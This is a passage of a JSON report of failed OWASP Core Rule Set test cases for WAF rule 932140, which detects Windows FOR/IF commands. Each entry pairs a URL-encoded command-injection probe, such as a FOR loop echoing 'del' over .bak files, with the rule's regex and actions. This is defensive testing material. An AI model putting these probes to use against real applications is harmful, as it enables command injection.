      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942511 - SQLi bypass attempt by ticks detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 33,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%26+FOR+%2FF+%22delims%3D%22+%25%7E+IN+++%28%27ECHO+foo%27%29DO+%40Echo+%25G",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 34,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 34,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=For+%2FR+C%3A%5Ctemp%5C+%25G+IN+%28%2A.bak%29+do+Echo+del+%22%25G%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 35,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 35,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=For+%2FR+C%3A%5Ctemp%5C+%25%25G+IN+%28%2A.bak%29+do+Echo+del+%22%25%25G%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 36,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 36,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2Ff+%22tokens%3D%2A%22+%25G+IN+%28%27dir+%2Fb%27%29+DO+%28call+%3Asubroutine+%22%25G%22%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 37,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 37,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2Ff+%22tokens%3D%2A%22+%25%25G+IN+%28%27dir+%2Fb%27%29+DO+%28call+%3Asubroutine+%22%25%25G%22%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
